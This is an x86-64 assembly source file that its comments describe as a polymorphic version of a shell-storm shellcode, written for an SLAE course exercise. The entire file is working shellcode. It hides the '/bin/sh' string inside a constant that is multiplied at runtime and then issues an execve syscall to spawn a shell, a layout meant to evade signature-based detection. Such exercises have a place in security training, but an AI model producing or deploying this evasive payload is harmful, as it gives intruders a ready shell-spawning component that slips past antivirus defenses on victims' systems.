;Original shellcode: http://shell-storm.org/shellcode/files/shellcode-806.php
; This is the polymorphic version of the original shellcode, created for SLAE task nr 6

global _start
section .text
_start:
    sub eax, eax
    mov rbx, 0xEEBE234583299
    imul rbx, 0x7
    push rbx
    push rsp
    pop rdi
    mov rdx, rax
    push rdx
    push rdi
    push rsp
    mov rsi, [rsp]
    add rsp, 0x8
    mov al, 0x3b
    syscall
